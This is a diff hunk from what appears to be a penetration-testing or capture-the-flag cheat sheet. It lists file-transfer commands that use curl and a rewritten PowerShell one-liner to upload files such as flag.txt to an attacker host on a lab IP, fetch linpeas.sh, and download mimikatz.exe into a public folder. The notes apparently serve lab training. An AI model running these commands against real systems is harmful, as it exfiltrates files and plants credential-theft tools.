@@ -42,7 +42,7 @@ curl -F 'file=@/home/ubuntu/Desktop/flag.txt' http://192.168.45.145/
 curl -O http://192.168.45.145/linpeas.sh
 
 # Upload with PowerShell
-$FilePath="C:\Users\Administrator\Desktop\flag.txt"; $Url="http://192.168.45.145/"; $client=New-Object System.Net.Http.HttpClient; $content=New-Object System.Net.Http.MultipartFormDataContent; $fileStream=[System.IO.File]::OpenRead($FilePath); $content.Add((New-Object System.Net.Http.StreamContent($fileStream)), "file", [System.IO.Path]::GetFileName($FilePath)); $client.PostAsync($Url, $content).Result.Content.ReadAsStringAsync().Result
+Add-Type -AssemblyName System.Net.Http; $client = New-Object System.Net.Http.HttpClient; $fs = [System.IO.File]::OpenRead("C:\Users\Public\test.out"); $content = New-Object System.Net.Http.MultipartFormDataContent; $fileContent = New-Object System.Net.Http.StreamContent($fs); $fileContent.Headers.ContentDisposition = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue("form-data"); $fileContent.Headers.ContentDisposition.Name = '"file"'; $fileContent.Headers.ContentDisposition.FileName = '"test.out"'; $content.Add($fileContent); $client.PostAsync("http://192.168.45.199/", $content).Wait(); $client.Dispose()
 
 # Download with PowerShell
 iwr -uri "http://192.168.45.145/mimikatz.exe" -OutFile "C:\Users\Public\mimikatz.exe"
